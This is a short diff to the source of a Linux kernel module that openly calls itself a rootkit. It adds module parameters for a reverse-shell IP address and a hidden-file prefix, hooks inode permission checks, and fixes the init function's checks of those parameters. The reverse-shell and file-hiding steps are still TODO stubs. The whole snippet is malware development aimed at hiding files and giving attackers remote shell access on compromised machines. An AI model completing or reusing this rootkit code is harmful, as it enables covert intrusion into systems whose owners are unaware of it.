@@ -20,8 +20,10 @@ MODULE_LICENSE("GPL");
 
 // Parameters.
 
+static char* rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, NULL);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
+static char* hidden_file_prefix = NULL;
 module_param(hidden_file_prefix, charp, NULL);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
 
@@ -63,11 +65,11 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 static int __init rootkit_init(void) {
     printk(KERN_INFO "Initializing rootkit.\n");
     khook_init();
-    if (!strcmp(rev_shell_ip, "")) {
+    if (rev_shell_ip) {
         // TODO: Set up reverse shell.
     }
 
-    if (!strcmp(hidden_file_prefix, "")) {
+    if (hidden_file_prefix) {
         // TODO: Set up hidden files.
     }
 
